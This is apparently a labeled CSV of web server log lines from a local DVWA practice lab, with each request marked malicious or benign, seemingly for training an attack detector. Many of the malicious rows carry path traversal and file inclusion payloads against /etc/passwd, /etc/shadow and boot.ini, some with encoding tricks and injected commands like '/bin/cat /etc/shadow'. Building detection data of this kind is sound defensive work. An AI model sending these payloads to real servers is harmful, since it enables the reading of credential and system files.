,url,malicious
122,"127.0.0.1 - - [28/Apr/2021:22:30:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
145,"127.0.0.1 - - [28/Apr/2021:22:31:15 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00%2ehtml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
231,"127.0.0.1 - - [28/Apr/2021:22:14:52 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=a"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
13,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
220,"127.0.0.1 - - [28/Apr/2021:22:32:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
128,"127.0.0.1 - - [28/Apr/2021:22:49:39 -0400] ""GET /DVWA/instructions.php HTTP/1.1"" 200 7546 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
90,"127.0.0.1 - - [28/Apr/2021:22:30:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
120,"127.0.0.1 - - [28/Apr/2021:21:49:06 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
166,"127.0.0.1 - - [28/Apr/2021:22:31:02 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%0a%2fbin%2fcat%20%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
165,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
148,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/ HTTP/1.1"" 302 448 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
177,"127.0.0.1 - - [28/Apr/2021:21:42:17 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
112,"127.0.0.1 - - [28/Apr/2021:21:49:04 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1957 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
218,"127.0.0.1 - - [28/Apr/2021:22:12:28 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
88,"127.0.0.1 - - [28/Apr/2021:22:49:59 -0400] ""GET /DVWA/vulnerabilities/brute/?username=a&password=fff&Login=Login HTTP/1.1"" 200 1687 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
33,"127.0.0.1 - - [28/Apr/2021:22:31:54 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%2finetpub%2fwwwroot%2fglobal%2easa HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
180,"127.0.0.1 - - [28/Apr/2021:22:33:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
184,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
68,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
143,"127.0.0.1 - - [28/Apr/2021:22:30:50 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2f%2e%5c%5c%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
105,"127.0.0.1 - - [28/Apr/2021:22:30:36 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
136,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
110,"127.0.0.1 - - [28/Apr/2021:22:49:41 -0400] ""GET /DVWA/vulnerabilities/brute/ HTTP/1.1"" 200 1663 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
26,"127.0.0.1 - - [28/Apr/2021:22:51:26 -0400] ""POST /DVWA/vulnerabilities/xss_s/ HTTP/1.1"" 200 1883 ""http://127.0.0.1/DVWA/vulnerabilities/xss_s/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
182,"127.0.0.1 - - [28/Apr/2021:22:49:40 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 2229 ""http://127.0.0.1/DVWA/instructions.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
168,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
139,"127.0.0.1 - - [28/Apr/2021:21:42:20 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
109,"127.0.0.1 - - [28/Apr/2021:22:32:58 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ejpg HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
103,"127.0.0.1 - - [28/Apr/2021:21:58:21 -0400] ""GET /DVWA/logout.php HTTP/1.1"" 302 336 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
16,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 200 749 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
48,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 488 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
43,"127.0.0.1 - - [28/Apr/2021:22:28:23 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../../../../../../../etc/passwd HTTP/1.1"" 200 2422 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
59,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
193,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
232,"127.0.0.1 - - [28/Apr/2021:21:58:18 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 487 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
91,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fhosts%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
131,"127.0.0.1 - - [28/Apr/2021:22:50:41 -0400] ""GET /DVWA/dvwa/css/source.css HTTP/1.1"" 200 497 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/test_credentials.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
32,"127.0.0.1 - - [28/Apr/2021:22:30:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
194,"127.0.0.1 - - [28/Apr/2021:22:30:35 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
203,"127.0.0.1 - - [28/Apr/2021:22:30:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2fetc%2fpasswd HTTP/1.1"" 200 2385 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
46,"127.0.0.1 - - [28/Apr/2021:22:51:03 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=4&Submit=Submit HTTP/1.1"" 200 1670 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=3&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
201,"127.0.0.1 - - [28/Apr/2021:21:53:23 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
111,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/images/logo.png HTTP/1.1"" 304 181 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
178,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 626 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
189,"127.0.0.1 - - [28/Apr/2021:22:32:53 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00%2ehtml HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
107,"127.0.0.1 - - [28/Apr/2021:21:40:29 -0400] ""GET /dvwa HTTP/1.1"" 404 488 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
229,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
125,"127.0.0.1 - - [28/Apr/2021:21:53:28 -0400] ""GET /DVWA/dvwa/images/login_logo.png HTTP/1.1"" 200 9375 ""http://127.0.0.1/DVWA/login.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
66,"127.0.0.1 - - [28/Apr/2021:22:28:10 -0400] ""GET /DVWA/vulnerabilities/fi/?page=././././././././././././etc/passwd HTTP/1.1"" 200 1352 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
37,"127.0.0.1 - - [28/Apr/2021:21:58:09 -0400] ""GET /DVWA//dvwa/js/add_event_listeners.js HTTP/1.1"" 200 625 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
75,"127.0.0.1 - - [28/Apr/2021:22:31:06 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2fetc%2fshadow%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
71,"127.0.0.1 - - [28/Apr/2021:22:51:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/ HTTP/1.1"" 200 1648 ""http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=English"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
2,"127.0.0.1 - - [28/Apr/2021:21:40:29 -0400] ""GET /favicon.ico HTTP/1.1"" 404 487 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
57,"127.0.0.1 - - [28/Apr/2021:22:30:49 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2f%2e%2e%5c%2e%2e%2fetc%2fshadow HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
8,"127.0.0.1 - - [28/Apr/2021:22:15:12 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1351 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
151,"127.0.0.1 - - [28/Apr/2021:22:27:20 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=../etc/passwd"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
99,"127.0.0.1 - - [28/Apr/2021:21:59:01 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1631 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
138,"127.0.0.1 - - [28/Apr/2021:21:49:05 -0400] ""POST /DVWA/setup.php HTTP/1.1"" 302 342 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
49,"127.0.0.1 - - [28/Apr/2021:22:31:42 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%5c%5c%26apos%3b%2fbin%2fcat%20%2fetc%2fpasswd%5c%5c%26apos%3b HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
106,"127.0.0.1 - - [28/Apr/2021:22:15:11 -0400] ""GET /DVWA/vulnerabilities/fi/?page=a HTTP/1.1"" 200 1351 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
141,"127.0.0.1 - - [28/Apr/2021:22:19:40 -0400] ""GET /DVWA/login.php HTTP/1.1"" 200 1161 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
132,"127.0.0.1 - - [28/Apr/2021:22:31:08 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%00%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
207,"127.0.0.1 - - [28/Apr/2021:21:58:07 -0400] ""GET /DVWA/dvwa/css/main.css HTTP/1.1"" 200 1445 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
23,"127.0.0.1 - - [28/Apr/2021:22:31:30 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%25%5c%2e%2e%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
127,"127.0.0.1 - - [28/Apr/2021:22:12:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=include.php HTTP/1.1"" 200 1627 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
69,"127.0.0.1 - - [28/Apr/2021:22:32:00 -0400] ""GET /DVWA/vulnerabilities/fi/?page=C%3a%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
214,"127.0.0.1 - - [28/Apr/2021:22:49:55 -0400] ""GET /DVWA/hackable/users/admin.jpg HTTP/1.1"" 200 3793 ""http://127.0.0.1/DVWA/vulnerabilities/brute/?username=admin&password=password&Login=Login"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
0,"127.0.0.1 - - [28/Apr/2021:22:50:05 -0400] ""POST /DVWA/vulnerabilities/exec/ HTTP/1.1"" 200 1629 ""http://127.0.0.1/DVWA/vulnerabilities/exec/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
213,"127.0.0.1 - - [28/Apr/2021:22:50:41 -0400] ""GET /DVWA/vulnerabilities/csrf/test_credentials.php HTTP/1.1"" 200 862 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
40,"127.0.0.1 - - [28/Apr/2021:22:31:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2f%2e%2e%c0%af%2e%2e%2fetc%2fpasswd HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
162,"127.0.0.1 - - [28/Apr/2021:22:11:37 -0400] ""GET /DVWA/dvwa/js/dvwaPage.js HTTP/1.1"" 200 815 ""http://127.0.0.1/DVWA/vulnerabilities/csrf/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
34,"127.0.0.1 - - [28/Apr/2021:22:32:22 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2f%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
190,"127.0.0.1 - - [28/Apr/2021:21:41:37 -0400] ""GET /DVWA/login.php HTTP/1.1"" 302 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
202,"127.0.0.1 - - [28/Apr/2021:22:30:34 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%2f%2e%2e%2fboot%2eini HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
142,"127.0.0.1 - - [28/Apr/2021:21:53:22 -0400] ""GET /DVWA/setup.php HTTP/1.1"" 200 1952 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
67,"127.0.0.1 - - [28/Apr/2021:21:58:12 -0400] ""GET /DVWA/vulnerabilities/upload/ HTTP/1.1"" 200 1802 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
102,"127.0.0.1 - - [28/Apr/2021:22:31:51 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fbin%2fid%7c HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
108,"127.0.0.1 - - [28/Apr/2021:22:32:45 -0400] ""GET /DVWA/vulnerabilities/fi/?page=%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cboot%2eini%00 HTTP/1.1"" 200 1315 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
181,"127.0.0.1 - - [28/Apr/2021:22:12:31 -0400] ""POST /DVWA/security.php HTTP/1.1"" 302 429 ""http://127.0.0.1/DVWA/security.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
158,"127.0.0.1 - - [28/Apr/2021:22:49:37 -0400] ""GET /dvwa/js/add_event_listeners.js HTTP/1.1"" 404 451 ""http://127.0.0.1/DVWA/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
197,"127.0.0.1 - - [28/Apr/2021:22:51:01 -0400] ""GET /DVWA/vulnerabilities/sqli/?id=2&Submit=Submit HTTP/1.1"" 200 1672 ""http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0
222,"127.0.0.1 - - [28/Apr/2021:22:12:20 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1"" 200 336 ""-"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1
